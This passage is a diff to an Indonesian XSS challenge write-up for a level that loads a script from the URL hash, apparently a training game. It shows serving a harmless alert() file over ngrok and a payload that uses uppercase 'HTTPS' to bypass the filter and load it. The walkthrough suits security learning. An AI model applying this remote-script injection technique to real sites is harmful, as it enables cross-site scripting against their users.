@@ -382,6 +382,37 @@ function includeGadget(url) {
 }
 ```
 
+<img width="1284" height="503" alt="image" src="https://github.com/user-attachments/assets/db0726f8-0b7a-4202-a31a-e60d7c36a358" />
+
+**🧪 Injeksi Hash (Hash Injection)**
+
+```#hii```
+
+<img width="956" height="210" alt="image" src="https://github.com/user-attachments/assets/6bb81b39-cb69-4d1d-bcb1-c464f5bee7c1" />
+
+```
+# Membuat file bernama adi.js yang berisi kode JavaScript untuk memunculkan kotak pesan (alert)
+echo "alert()" > adi.js
+
+# Menjalankan server web sederhana menggunakan Python pada port 80
+python3 -m http.server 80
+
+# Menjalankan Ngrok untuk membuat terowongan (tunnel) publik ke server lokal di port 80
+ngrok http 80
+```
+
+<img width="291" height="106" alt="image" src="https://github.com/user-attachments/assets/41e69b41-a1e9-4475-a7a1-10a7f6a250ef" />
+
+💥 Payload Terakhir (Level 6)
+
+```#HTTPS://a45cc0a21617.ngrok-free.app/adi.js```
+
+```HTTPS huruf besar (Uppercase HTTPS) melewati filter```
+
+<img width="685" height="322" alt="image" src="https://github.com/user-attachments/assets/4a30118d-b5ee-43ad-ab85-9bcb3741f107" />
+
+<img width="661" height="365" alt="image" src="https://github.com/user-attachments/assets/b64d2193-fd48-4f29-b3c4-ee4fe11a0a7d" />
+
 ***
 Fokus Materi
 
